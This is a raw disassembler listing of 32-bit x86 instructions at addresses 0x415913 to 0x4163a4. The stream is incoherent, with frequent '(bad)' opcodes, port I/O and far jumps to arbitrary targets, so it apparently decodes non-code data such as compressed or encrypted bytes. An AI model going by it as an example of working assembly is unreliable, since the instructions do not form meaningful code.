  415913:	xor    eax,0x1ee07a4e
  415918:	leave  
  415919:	sub    eax,0xbc07b521
  41591e:	not    ebp
  415920:	xor    bh,dl
  415922:	cs sub al,0x14
  415925:	xor    al,0xa7
  415927:	inc    BYTE PTR [eax-0x8]
  41592a:	je     0x4158eb
  41592c:	ss ss aad 0xcb
  415930:	and    dh,BYTE PTR [edi+0x2912c285]
  415936:	sar    eax,1
  415938:	ret    
  415939:	fwait
  41593a:	adc    ebp,DWORD PTR [esi-0x4ca2afdf]
  415940:	jae    0x4158ed
  415942:	push   ecx
  415943:	nop
  415944:	jno    0x4158d7
  415946:	push   edx
  415947:	jns    0x4159c4
  415949:	xchg   ebx,eax
  41594a:	mov    ebx,0x3158794b
  41594f:	retf   0x2120
  415952:	cli    
  415953:	sbb    ebx,ebx
  415955:	push   es
  415956:	gs dec esi
  415958:	(bad)  
  415959:	cmp    DWORD PTR [esi+0x543502f1],ecx
  41595f:	gs pop esi
  415961:	dec    edi
  415962:	mul    bh
  415964:	or     eax,0x59f94a25
  415969:	std    
  41596a:	stos   DWORD PTR es:[edi],eax
  41596b:	sti    
  41596c:	enter  0x9075,0xd3
  415970:	in     eax,0x1
  415972:	pop    ebx
  415973:	out    dx,eax
  415974:	and    al,0x39
  415976:	mov    ebx,0xf7230b87
  41597b:	imul   ecx,eax,0x52fbe88f
  415981:	adc    BYTE PTR [esi+0x708c4a7e],0x77
  415988:	dec    esi
  415989:	push   esi
  41598a:	dec    edi
  41598b:	mov    al,ds:0x44b8d66
	...
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	cmp    al,0xe6
  415a02:	aaa    
  415a03:	hlt    
  415a04:	and    al,0xe4
  415a06:	add    BYTE PTR [eax],al
  415a08:	add    al,0x1
  415a0a:	add    BYTE PTR [eax],al
  415a0c:	gs pop es
  415a0e:	sbb    al,0x4f
  415a10:	push   ecx
  415a11:	imul   esi,ebx,0x64
  415a14:	sbb    BYTE PTR [eax+0x1],0x87
  415a18:	cmp    eax,0x448be0bb
  415a1d:	popf   
  415a1e:	jge    0x4159fa
  415a20:	scas   al,BYTE PTR es:[edi]
  415a21:	js     0x4159ea
  415a23:	dec    esi
  415a24:	mov    ebx,0xd45389ee
  415a29:	scas   al,BYTE PTR es:[edi]
  415a2a:	add    ah,dh
  415a2c:	retf   0x8416
  415a2f:	int3   
  415a30:	ja     0x415a69
  415a32:	in     eax,0x5c
  415a34:	rcl    BYTE PTR [eax+ebp*4-0x584f38bc],0x17
  415a3c:	mov    esp,0xc1241f68
  415a41:	in     eax,dx
  415a42:	sbb    al,0x3
  415a44:	sub    eax,0xcf4cd222
  415a49:	(bad)  
  415a4a:	pop    ebp
  415a4b:	test   BYTE PTR [edi+0x6c],al
  415a4e:	push   0x5f
  415a50:	mov    ebp,0x8c36c943
  415a55:	popf   
  415a56:	or     eax,0xd9ee8151
  415a5b:	mov    al,ds:0x177f9467
  415a60:	push   0xa38d65b9
  415a65:	loopne 0x415a90
  415a67:	pop    esi
  415a68:	es mov esp,0xcbf56394
  415a6e:	xchg   esi,eax
  415a6f:	imul   ebp,DWORD PTR [ecx-0x64],0x8a52d129
  415a76:	into   
  415a77:	xchg   ebp,eax
  415a78:	ret    0x2354
  415a7b:	cmp    BYTE PTR [ecx],0x1f
  415a7e:	push   ss
  415a7f:	test   DWORD PTR [ebp+eax*1-0x8],0x40a33aa6
  415a87:	jb     0x415a99
  415a89:	inc    ebx
  415a8a:	daa    
  415a8b:	jno    0x415a5b
  415a8d:	hlt    
  415a8e:	mov    al,0x41
  415a90:	ret    
  415a91:	out    0xf6,al
  415a93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a94:	sub    DWORD PTR [ebx+0x504168a8],0x6043cdd2
  415a9e:	mov    ds:0xb4b05eba,eax
  415aa3:	or     DWORD PTR [ecx],0xffffffd6
  415aa6:	or     esi,DWORD PTR [ebp+0x5e]
  415aa9:	jnp    0x415a7a
  415aab:	aam    0x52
  415aad:	dec    ecx
  415aae:	sbb    ch,BYTE PTR [ebp+0x74]
  415ab1:	jb     0x415a91
  415ab3:	out    0x2,eax
  415ab5:	or     ah,ah
  415ab7:	pop    ebp
  415ab8:	fiadd  DWORD PTR [esi-0x21]
  415abb:	pop    ecx
  415abc:	fadd   st(5),st
  415abe:	aam    0xab
  415ac0:	cmp    DWORD PTR [ebx],0xffffffcd
  415ac3:	add    al,0x78
  415ac5:	cli    
  415ac6:	mov    ds:0x82e4d2e5,al
  415acb:	and    al,0x8d
  415acd:	icebp  
  415ace:	scas   eax,DWORD PTR es:[edi]
  415acf:	cmp    eax,0x29cf2640
  415ad4:	jle    0x415a89
  415ad6:	fisttp DWORD PTR [eax+0x37]
  415ad9:	dec    al
  415adb:	fcmovb st,st(7)
  415add:	xchg   ebx,eax
  415ade:	mov    edi,0xc8955e22
  415ae3:	ror    al,cl
  415ae5:	mov    eax,0x374eada1
  415aea:	leave  
  415aeb:	lock pop es
  415aed:	out    dx,eax
  415aee:	inc    BYTE PTR [eax]
  415af0:	sbb    dl,BYTE PTR [ecx-0x73e5e945]
  415af6:	push   esi
  415af7:	les    ebp,FWORD PTR [esi+0x39]
  415afa:	sbb    ebp,ebx
  415afc:	push   es
  415afd:	enter  0x169c,0xa9
  415b01:	(bad)
  415b04:	ins    BYTE PTR es:[edi],dx
  415b05:	rcr    BYTE PTR [eax-0x9bf4b1e],cl
  415b0b:	sub    BYTE PTR [ebp-0x2e],bh
  415b0e:	fxsave [eax]
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fmul   QWORD PTR [ecx-0x6]
  415b82:	(bad)  
  415b83:	jo     0x415bad
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR [ecx+eax*1],al
  415b8a:	add    BYTE PTR [eax],al
  415b8c:	push   ss
  415b8d:	shl    DWORD PTR [ebx-0x8],1
  415b90:	fs dec edx
  415b92:	cmp    bh,BYTE PTR [esi]
  415b94:	sbb    ch,0x4c
  415b97:	lahf   
  415b98:	in     al,0xcb
  415b9a:	js     0x415baf
  415b9c:	cmp    BYTE PTR [edx-0x2fb3edda],dl
  415ba2:	add    ah,BYTE PTR [esi]
  415ba4:	retf   
  415ba5:	add    BYTE PTR [ebx-0x7f2106bc],ch
  415bab:	xor    BYTE PTR [ebx+0x58],dl
  415bae:	fild   DWORD PTR [ecx+0x26]
  415bb1:	cmc    
  415bb2:	test   BYTE PTR gs:[edi+0x27],bl
  415bb6:	xor    cl,0x40
  415bb9:	push   edx
  415bba:	paddsw mm1,mm0
  415bbd:	imul   ebx,DWORD PTR [eax+0x4404e3d2],0x95fe78df
  415bc7:	cld    
  415bc8:	ja     0x415b8f
  415bca:	sub    eax,0x833a86f8
  415bcf:	sub    al,0x79
  415bd1:	sti    
  415bd2:	ins    BYTE PTR es:[edi],dx
  415bd3:	ins    DWORD PTR es:[edi],dx
  415bd4:	cli    
  415bd5:	fsub   QWORD PTR [esi+0x5e]
  415bd8:	aaa    
  415bd9:	inc    esi
  415bda:	jp     0x415c1d
  415bdc:	retf   
  415bdd:	aad    0x13
  415bdf:	ror    DWORD PTR [ecx+edi*2+0x50],0x17
  415be4:	cmp    dl,BYTE PTR [esi-0x41]
  415be7:	in     eax,dx
  415be8:	lods   al,BYTE PTR ds:[esi]
  415be9:	push   ecx
  415bea:	sti    
  415beb:	mov    DWORD PTR [ebp+0x16],ebp
  415bee:	js     0x415c5a
  415bf0:	pop    edi
  415bf1:	inc    ecx
  415bf2:	lods   al,BYTE PTR ds:[esi]
  415bf3:	jecxz  0x415c19
  415bf5:	add    al,0xd7
  415bf7:	jp     0x415b9e
  415bf9:	aam    0x70
  415bfb:	cmp    BYTE PTR [edx],bl
  415bfd:	push   edi
  415bfe:	sub    BYTE PTR [ecx],ah
  415c00:	cmp    dh,ah
  415c02:	push   ebx
  415c03:	(bad)
  415c06:	push   ecx
  415c07:	es inc edi
  415c09:	xchg   ebp,eax
  415c0a:	jmp    ebp
  415c0c:	fwait
  415c0d:	je     0x415ba8
  415c0f:	add    edx,eax
  415c11:	lods   al,BYTE PTR ds:[esi]
  415c12:	cld    
  415c13:	aam    0x39
  415c15:	(bad)  
  415c16:	je     0x415c54
  415c18:	cmp    eax,0x74cd77cf
  415c1d:	scas   eax,DWORD PTR es:[edi]
  415c1e:	lods   eax,DWORD PTR ds:[esi]
  415c1f:	test   BYTE PTR [edx],bl
  415c21:	ss std 
  415c23:	daa    
  415c24:	mov    bh,0xa
  415c26:	ret    
  415c27:	icebp  
  415c28:	int    0x43
  415c2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c2b:	push   edi
  415c2c:	pop    esp
  415c2d:	sti    
  415c2e:	cld    
  415c2f:	push   edi
  415c30:	(bad)  
  415c31:	or     eax,0x841043d6
  415c36:	js     0x415bca
  415c38:	sbb    eax,0xaf109a5a
  415c3d:	jb     0x415bc3
  415c3f:	stos   DWORD PTR es:[edi],eax
  415c40:	mov    edi,0x6d5abb45
  415c45:	repz jno 0x415c1d
  415c48:	das    
  415c49:	sbb    al,0xb2
  415c4b:	(bad)  
  415c4c:	mov    ?,ecx
  415c4e:	add    al,0xd4
  415c50:	xor    edx,DWORD PTR [esi+ecx*2+0x28b77365]
  415c57:	inc    dh
  415c59:	xor    ecx,DWORD PTR [edi+0x14a796de]
  415c5f:	rol    DWORD PTR [edi],1
  415c61:	sbb    al,0xb4
  415c63:	call   0x7c87:0x92d55518
  415c6a:	out    0x2a,al
  415c6c:	jecxz  0x415c8a
  415c6e:	adc    al,0xa0
  415c70:	jae    0x415cde
  415c72:	xchg   esi,eax
  415c73:	lahf   
  415c74:	add    BYTE PTR [ebx],cl
  415c76:	ins    BYTE PTR es:[edi],dx
  415c77:	jbe    0x415c38
  415c79:	jne    0x415ca4
  415c7b:	adc    DWORD PTR [ecx+0x36a14de2],eax
  415c81:	push   edx
  415c82:	iret   
  415c83:	cmp    dl,BYTE PTR [esi+0x4e]
  415c86:	shl    ebx,cl
  415c88:	ret    
  415c89:	in     eax,dx
  415c8a:	icebp  
  415c8b:	pop    esp
  415c8c:	sub    al,0xb9
  415c8e:	call   0x415cb4
	...
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x40f6de1f
  415d03:	xor    al,0x2c
  415d05:	out    0x0,al
  415d07:	add    BYTE PTR [ecx+eax*1],al
  415d0a:	add    BYTE PTR [eax],al
  415d0c:	cli    
  415d0d:	mov    eax,0xe9c16fac
  415d12:	call   0x53ea:0x192f7601
  415d19:	ss mov bl,0xc7
  415d1c:	leave  
  415d1d:	add    al,0x5a
  415d1f:	not    DWORD PTR [ebp-0x14d306f0]
  415d25:	popa   
  415d26:	jbe    0x415d7b
  415d28:	aad    0xcb
  415d2a:	xchg   BYTE PTR [edx],bl
  415d2c:	xor    DWORD PTR [eax],edx
  415d2e:	xchg   esp,eax
  415d2f:	fild   DWORD PTR [edi+0x746ac88d]
  415d35:	fimul  DWORD PTR [edi]
  415d37:	psubb  mm6,QWORD PTR [eax+edx*8]
  415d3b:	add    DWORD PTR [edx-0x7a],0x94b23d5d
  415d42:	out    dx,eax
  415d43:	icebp  
  415d44:	inc    edx
  415d45:	(bad)
  415d48:	sub    BYTE PTR [esi+esi*1],cl
  415d4b:	out    0xd8,eax
  415d4d:	aaa    
  415d4e:	sub    eax,0x1213ea05
  415d53:	and    BYTE PTR [eax-0x2f3f3248],dl
  415d59:	scas   eax,DWORD PTR es:[edi]
  415d5a:	fisttp DWORD PTR [ebx+edx*8-0x4d8f9187]
  415d61:	call   0xdcc47ea0
  415d66:	dec    ecx
  415d67:	mov    edx,0xebdbc945
  415d6c:	ret    0xc35c
  415d6f:	jecxz  0x415d29
  415d71:	inc    ebx
  415d72:	inc    ecx
  415d73:	push   0xffffffb6
  415d75:	scas   al,BYTE PTR es:[edi]
  415d76:	mov    edi,0xcd701288
  415d7b:	pop    ds
  415d7c:	add    dl,BYTE PTR [ebp+0x76]
  415d7f:	push   ss
  415d80:	nop
  415d81:	or     cl,BYTE PTR [ecx+0x24fee628]
  415d87:	nop
  415d88:	ficom  DWORD PTR [edi-0x20ccdf9b]
  415d8e:	ret    
  415d8f:	pusha  
  415d90:	dec    ebx
  415d91:	inc    esp
  415d92:	push   edi
  415d93:	mov    cs,WORD PTR [esi]
  415d95:	xchg   ecx,eax
  415d96:	(bad)  
  415d97:	js     0x415de6
  415d99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d9a:	add    DWORD PTR [esi],ecx
  415d9c:	xchg   dh,al
  415d9e:	mov    edi,0xa53af8a0
  415da3:	cdq    
  415da4:	imul   esp,DWORD PTR [edx+0x393fa31f],0xdfb53d74
  415dae:	retf   
  415daf:	(bad)
  415db2:	jecxz  0x415e2b
  415db4:	lods   al,BYTE PTR ds:[esi]
  415db5:	aas    
  415db6:	je     0x415dfd
  415db8:	fsub   DWORD PTR ds:0x164f3f6f
  415dbe:	mov    esp,0x57447183
  415dc3:	fwait
  415dc4:	push   es
  415dc5:	jno    0x415e0b
  415dc7:	push   ecx
  415dc8:	loop   0x415e12
  415dca:	leave  
  415dcb:	adc    BYTE PTR [esi+0x2ce34b65],al
  415dd1:	pop    ss
  415dd2:	in     al,dx
  415dd3:	daa    
  415dd4:	mov    bh,0x11
  415dd6:	or     BYTE PTR [edx-0x2c],bl
  415dd9:	mov    eax,edi
  415ddb:	es mov bh,0x29
  415dde:	push   0x31
  415de0:	dec    edx
  415de1:	mov    dh,0x94
  415de3:	aam    0x90
  415de5:	add    al,0xb1
  415de7:	xor    esi,DWORD PTR [ebx+0x6911e04]
  415ded:	(bad)  
  415dee:	das    
  415def:	push   0x7f
  415df1:	ja     0x415e32
  415df3:	jae    0x415d8c
  415df5:	sub    al,0x3a
  415df7:	sti    
  415df8:	dec    ecx
  415df9:	aam    0xfb
  415dfb:	pusha  
  415dfc:	test   al,0x3f
  415dfe:	hlt    
  415dff:	pushf  
  415e00:	sub    eax,0xcc19b324
  415e05:	jb     0x415dcf
  415e07:	xor    dl,dl
  415e09:	test   DWORD PTR [edi],0xe5495e31
  415e0f:	sub    al,0x0
	...
  415e71:	add    BYTE PTR [eax],al
  415e73:	add    dh,ch
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x46]
  415e81:	mov    ch,0x17
  415e83:	xchg   DWORD PTR [eax],esi
  415e85:	out    0x0,eax
  415e87:	add    BYTE PTR [ecx+eax*1],al
  415e8a:	add    BYTE PTR [eax],al
  415e8c:	pop    esi
  415e8d:	mov    cl,0xcc
  415e8f:	jmp    0xe7993fa2
  415e94:	stc    
  415e95:	pop    ebx
  415e96:	and    dl,dl
  415e98:	push   ebp
  415e99:	test   ch,al
  415e9b:	cmp    DWORD PTR [esi],edi
  415e9d:	push   0x2ffbd234
  415ea2:	jle    0x415ee3
  415ea4:	mov    BYTE PTR cs:[ebx],ah
  415ea7:	xchg   esi,eax
  415ea8:	xlat   BYTE PTR ds:[ebx]
  415ea9:	and    bh,BYTE PTR [ebx-0x34]
  415eac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ead:	je     0x415ee3
  415eaf:	retf   
  415eb0:	int    0x7b
  415eb2:	jne    0x415ee2
  415eb4:	pop    ss
  415eb5:	dec    edx
  415eb6:	xchg   ebp,eax
  415eb7:	jecxz  0x415ee0
  415eb9:	push   es
  415eba:	call   0x823fa5cf
  415ebf:	pop    ebx
  415ec0:	xor    eax,0xeaf86cf8
  415ec5:	inc    esi
  415ec6:	xchg   edi,eax
  415ec7:	push   edi
  415ec8:	sub    esp,eax
  415eca:	or     BYTE PTR [ecx-0xf],bl
  415ecd:	xor    esi,ebx
  415ecf:	test   DWORD PTR [eax-0x4c],esi
  415ed2:	inc    edx
  415ed3:	jne    0x415f38
  415ed5:	aam    0x86
  415ed7:	sbb    BYTE PTR [ebp-0x32],ch
  415eda:	mov    edi,0xf7c16057
  415edf:	test   al,0x77
  415ee1:	cld    
  415ee2:	xchg   edi,eax
  415ee3:	pop    esi
  415ee4:	rol    DWORD PTR ds:[edi+edx*8+0x149cf86e],1
  415eec:	inc    ebp
  415eed:	sahf   
  415eee:	mov    bh,0x50
  415ef0:	ror    BYTE PTR [edx],0x3f
  415ef3:	call   0xe9c25e96
  415ef8:	out    dx,al
  415ef9:	or     eax,0xbb94de51
  415efe:	inc    esi
  415eff:	rcr    BYTE PTR [ebp+0x799665cf],cl
  415f05:	(bad)
  415f08:	dec    ebp
  415f09:	and    BYTE PTR [edi-0x6fab63af],0x3b
  415f10:	sbb    dh,BYTE PTR [ebp+0x3c99e272]
  415f16:	mov    ebp,0xd4234126
  415f1b:	lea    ebx,[eax-0x67668b48]
  415f21:	mov    ds:0x9b91716b,al
  415f26:	repnz fiadd DWORD PTR [ebp+0x1196a88b]
  415f2d:	fs es scas al,BYTE PTR es:[edi]
  415f30:	jae    0x415ebe
  415f32:	mov    eax,ds:0x941c69cc
  415f37:	in     al,0x8d
  415f39:	cmp    ah,BYTE PTR [ebx+0x440ca116]
  415f3f:	loopne 0x415fb1
  415f41:	sub    bl,BYTE PTR [eax]
  415f43:	shr    DWORD PTR [eax-0x4680d7e3],cl
  415f49:	cs test esp,esp
  415f4c:	xlat   BYTE PTR ds:[ebx]
  415f4d:	inc    esi
  415f4e:	jecxz  0x415f5c
  415f50:	mov    bh,0x28
  415f52:	icebp  
  415f53:	xchg   ebx,eax
  415f54:	sbb    DWORD PTR [ecx],ebp
  415f56:	test   al,0xe9
  415f58:	push   edi
  415f59:	sbb    BYTE PTR [edx+0x72],cl
  415f5c:	jecxz  0x415f2b
  415f5e:	icebp  
  415f5f:	es and ecx,ebx
  415f62:	xchg   esp,eax
  415f63:	ins    DWORD PTR es:[edi],dx
  415f64:	leave  
  415f65:	sbb    ecx,DWORD PTR [edx]
  415f67:	add    ebx,esi
  415f69:	mov    eax,0x6b007e0
  415f6e:	loopne 0x415fb6
  415f70:	xchg   BYTE PTR [ebx],ah
  415f72:	and    dl,BYTE PTR [ebx+0x39295d29]
  415f78:	loop   0x415fab
  415f7a:	ror    DWORD PTR [ecx+0x3d],1
  415f7d:	pop    ds
  415f7e:	mov    ah,0xbd
  415f80:	and    al,0x8f
  415f82:	mov    edx,0x74d57a73
  415f87:	adc    al,0x78
  415f89:	add    al,0xff
  415f8b:	aas    
  415f8c:	pushf  
  415f8d:	adc    DWORD PTR [ecx],edx
  415f8f:	pop    es
	...
  415ff4:	pop    ss
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	jecxz  0x415fd2
  416002:	sub    dl,ah
  416004:	xor    al,0xe8
  416006:	add    BYTE PTR [eax],al
  416008:	add    al,0x1
  41600a:	add    BYTE PTR [eax],al
  41600c:	pusha  
  41600d:	jecxz  0x41607e
  41600f:	cmp    eax,0x595eb855
  416014:	xor    BYTE PTR [ecx+0x28],0x77
  416018:	xor    DWORD PTR [edi+0x39b7a099],0xffffff98
  41601f:	imul   edi,ebx,0x74513f2a
  416025:	loope  0x415fd4
  416027:	inc    eax
  416028:	cmp    ah,BYTE PTR [eax+0x10eb7126]
  41602e:	loopne 0x41602c
  416030:	das    
  416031:	mov    eax,0xd60ea5b6
  416036:	lods   al,BYTE PTR ds:[esi]
  416037:	ret    
  416038:	data16 loope 0x415fe3
  41603b:	lods   al,BYTE PTR fs:[esi]
  41603d:	arpl   WORD PTR [edi+0x74977781],si
  416043:	les    esp,FWORD PTR [ecx+0x29be5252]
  416049:	loopne 0x416018
  41604b:	pusha  
  41604c:	std    
  41604d:	push   ebx
  41604e:	push   es
  41604f:	adc    cl,ch
  416051:	mov    ch,0x4a
  416053:	add    DWORD PTR ss:[esi+0x3f7bdb90],esi
  41605a:	hlt    
  41605b:	mov    DWORD PTR [eax],0x63ee7a9f
  416061:	arpl   WORD PTR [ecx+eiz*8+0x1100bb80],bp
  416068:	rol    BYTE PTR [ecx],0x70
  41606b:	loopne 0x416082
  41606d:	adc    eax,0xd0d94a4a
  416072:	push   0xef4721e3
  416077:	es jle 0x416001
  41607a:	jge    0x415ffd
  41607c:	(bad)  
  41607d:	fimul  WORD PTR [esi-0x738ce510]
  416083:	jl     0x416103
  416085:	pop    ebx
  416086:	inc    ebx
  416087:	es push es
  416089:	fist   DWORD PTR [eax-0x37]
  41608c:	cli    
  41608d:	and    al,0x9a
  41608f:	mov    WORD PTR [ebp+0x41],es
  416092:	pop    ebp
  416093:	and    eax,0x8068b89f
  416098:	ret    
  416099:	das    
  41609a:	fnstcw WORD PTR [esi+0x4a71fb44]
  4160a0:	imul   BYTE PTR [eax]
  4160a2:	mov    al,0xcf
  4160a4:	popf   
  4160a5:	imul   edi,DWORD PTR [edi+0x71],0x7531dfc2
  4160ac:	jge    0x416047
  4160ae:	jmp    0xcbf3d03e
  4160b3:	stos   BYTE PTR es:[edi],al
  4160b4:	sub    ebx,esp
  4160b6:	stos   BYTE PTR es:[edi],al
  4160b7:	loope  0x4160a9
  4160b9:	push   ebx
  4160ba:	lea    ebp,[edi]
  4160bc:	jns    0x416087
  4160be:	fldcw  WORD PTR [edx+0x7b47729f]
  4160c4:	push   esp
  4160c5:	jbe    0x4160ea
  4160c7:	call   edx
  4160c9:	les    eax,FWORD PTR [edx+ebx*4+0x237d2490]
  4160d0:	repnz mov ch,0x70
  4160d3:	pop    ds
  4160d4:	iret   
  4160d5:	and    esi,DWORD PTR [esi-0x64c82367]
  4160db:	mov    eax,ds:0x75f4dd06
  4160e0:	fwait
  4160e1:	out    dx,al
  4160e2:	jmp    0x5fd2b9b3
  4160e7:	and    BYTE PTR [ebp-0x19],al
  4160ea:	or     BYTE PTR [ecx-0x2bf3b24d],cl
  4160f0:	rcr    BYTE PTR [ebx],cl
  4160f2:	mov    WORD PTR [edi],gs
  4160f4:	(bad)  
  4160f5:	jmp    0x459f:0x5812ecf8
  4160fc:	clc    
  4160fd:	stos   BYTE PTR es:[edi],al
  4160fe:	mov    al,0x90
  416100:	jne    0x41617c
  416102:	or     esp,esi
  416104:	arpl   WORD PTR [ebp-0x23],bx
  416107:	scas   al,BYTE PTR es:[edi]
  416108:	pop    ebp
  416109:	sbb    DWORD PTR [esi],0x11d2ae94
  41610f:	add    BYTE PTR fs:[eax],al
	...
  416172:	add    BYTE PTR [eax],al
  416174:	and    cl,ch
  416176:	cmp    ebx,esi
  416178:	sti    
  416179:	fsubrp st(5),st
  41617b:	inc    esi
  41617d:	push   edx
  41617e:	sub    eax,0xc08cdcf3
  416183:	xchg   DWORD PTR [eax],edi
  416185:	jmp    0x145618a
  41618a:	add    BYTE PTR [eax],al
  41618c:	not    bl
  41618e:	dec    esp
  41618f:	stc    
  416190:	dec    eax
  416191:	or     ebx,ebx
  416193:	mov    bl,dh
  416195:	(bad)  
  416196:	not    BYTE PTR [edi]
  416198:	mov    dl,0x48
  41619a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41619b:	loop   0x4161f3
  41619d:	hlt    
  41619e:	fdiv   QWORD PTR [esi+0x11]
  4161a1:	jne    0x416164
  4161a3:	add    al,0x6b
  4161a5:	clc    
  4161a6:	mov    eax,ds:0xfc7f4e7f
  4161ab:	jmp    0x2e67:0x1c8d7678
  4161b2:	rcr    DWORD PTR [ebx-0x16a7507],1
  4161b8:	call   0x71fb:0x264b31e8
  4161bf:	jecxz  0x4161d0
  4161c1:	(bad)  
  4161c2:	in     al,0x99
  4161c4:	cmp    DWORD PTR [edi],esp
  4161c6:	test   DWORD PTR [ebx],eax
  4161c8:	pop    ds
  4161c9:	mov    ds:0xdea651a7,al
  4161ce:	add    edi,edi
  4161d0:	leave  
  4161d1:	shl    esi,cl
  4161d3:	lock pushf 
  4161d5:	jl     0x4161f0
  4161d7:	mov    dh,0x5b
  4161d9:	je     0x416170
  4161db:	mov    bl,0x30
  4161dd:	nop
  4161de:	mov    bh,0xdb
  4161e0:	repnz or BYTE PTR [ebx],al
  4161e3:	pop    ebx
  4161e4:	push   sp
  4161e6:	and    edx,ebx
  4161e8:	lahf   
  4161e9:	test   BYTE PTR [edi+ecx*2+0x2163280c],al
  4161f0:	stc    
  4161f1:	and    al,0x35
  4161f3:	adc    edx,DWORD PTR [ebp-0x525c27e8]
  4161f9:	fild   DWORD PTR [ebp-0x1e6a757e]
  4161ff:	dec    ebp
  416200:	and    eax,0xc8e6fa7
  416205:	inc    esp
  416206:	add    BYTE PTR [eax+0x9e7cae8],bl
  41620c:	add    ch,BYTE PTR [eax+0x55]
  41620f:	retf   
  416210:	loope  0x416248
  416212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416213:	popa   
  416214:	push   ds
  416215:	jae    0x416286
  416217:	pushf  
  416218:	sbb    al,0xb1
  41621a:	add    edx,DWORD PTR [esi*4+0x12e2e750]
  416221:	xor    ah,BYTE PTR [eax]
  416223:	and    DWORD PTR cs:[edx],0xffffff9c
  416227:	je     0x4161c1
  416229:	lds    esi,FWORD PTR [edx]
  41622b:	pop    eax
  41622c:	mov    cl,0x2e
  41622e:	cli    
  41622f:	std    
  416230:	data16 lahf 
  416232:	xor    eax,0x1fb626e1
  416237:	add    esi,DWORD PTR [esi]
  416239:	out    dx,eax
  41623a:	fincstp 
  41623c:	jge    0x41625e
  41623e:	stos   BYTE PTR es:[edi],al
  41623f:	sbb    dl,BYTE PTR [ebp+edx*2+0x1a]
  416243:	popa   
  416244:	popa   
  416245:	mov    bh,0xd2
  416247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416248:	and    BYTE PTR [edi+0x684331fe],0xe
  41624f:	mov    ah,0x1
  416251:	or     eax,0x271579f3
  416256:	xlat   BYTE PTR ds:[ebx]
  416257:	mov    ecx,DWORD PTR [edi]
  416259:	bound  edx,QWORD PTR [esi]
  41625b:	out    0xc9,eax
  41625d:	sub    eax,0x785d9fa
  416262:	dec    ebp
  416263:	nop
  416264:	lods   eax,DWORD PTR ds:[esi]
  416265:	and    ecx,ecx
  416267:	out    dx,eax
  416268:	push   edi
  416269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41626a:	and    DWORD PTR [ecx],esi
  41626c:	(bad)  
  41626d:	int    0x9e
  41626f:	mov    edi,0x918cd7e1
  416274:	ja     0x41627d
  416276:	imul   BYTE PTR [ebp-0x67]
  416279:	dec    esi
  41627a:	(bad)  
  41627c:	stos   DWORD PTR es:[edi],eax
  41627d:	mov    ch,0x26
  41627f:	adc    ebx,edx
  416281:	xor    ebp,DWORD PTR ds:0xed304896
  416287:	jmp    0x4162ec
  416289:	xor    BYTE PTR [esp+eiz*8],ch
  41628c:	or     bl,dh
  41628e:	xchg   DWORD PTR [esi],ebx
	...
  4162f4:	and    ebp,DWORD PTR [esi+0x32]
  4162f7:	and    eax,0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x3cea:0x5f07fdee
  416305:	jmp    0x0:0x1040000
  41630c:	std    
  41630d:	jge    0x416340
  41630f:	inc    eax
  416310:	or     eax,0x59c265ac
  416315:	xor    al,0xbb
  416317:	pushf  
  416318:	lahf   
  416319:	ss cld 
  41631b:	dec    edi
  41631c:	ret    
  41631d:	sub    eax,0x5ed94030
  416322:	xchg   bh,ah
  416324:	or     ebx,eax
  416326:	sub    al,0x99
  416328:	(bad)  
  41632a:	sbb    eax,0x7af1703e
  41632f:	jecxz  0x4162b8
  416331:	test   eax,0xbed5f527
  416336:	push   esp
  416337:	outs   dx,DWORD PTR ds:[esi]
  416338:	cmp    al,0x6f
  41633a:	in     al,0x42
  41633c:	jns    0x4162cf
  41633e:	pusha  
  41633f:	inc    edx
  416340:	and    edi,0xa2a89c9d
  416346:	daa    
  416347:	cmp    BYTE PTR [ebp+ebx*1+0x1664cc02],dh
  41634e:	add    eax,DWORD PTR [ebx+0x5b1ece0c]
  416354:	aad    0x40
  416356:	mov    al,0xc5
  416358:	ror    BYTE PTR [ebp+0x1b],1
  41635b:	fisubr DWORD PTR [edi-0x428088bb]
  416361:	aas    
  416362:	pop    ebp
  416363:	clc    
  416364:	xchg   BYTE PTR [edi+0x4fdfeaed],bh
  41636a:	int    0xd4
  41636c:	pop    esi
  41636d:	sti    
  41636e:	sbb    al,0x34
  416370:	or     al,0xa
  416372:	les    ebp,FWORD PTR [edx+ecx*8+0x3f517d31]
  416379:	xchg   esi,eax
  41637a:	aaa    
  41637b:	push   0xa4b2999
  416380:	(bad)  
  416381:	adc    eax,0xb73659d
  416386:	xchg   bp,ax
  416388:	sub    al,0x37
  41638a:	sbb    ecx,esi
  41638c:	adc    eax,DWORD PTR [ebx+0x7f]
  41638f:	mov    bl,BYTE PTR [ebp-0x45]
  416392:	xor    ch,dh
  416394:	retf   
  416395:	or     dh,al
  416397:	imul   edx,edx,0x43
  41639a:	mov    ebx,DWORD PTR [edx+0x65dc8d7]
  4163a0:	and    BYTE PTR [ebp-0x53],dl
  4163a3:	outs   dx,BYTE PTR ds:[esi]
  4163a4:	mov    ah,0xbd
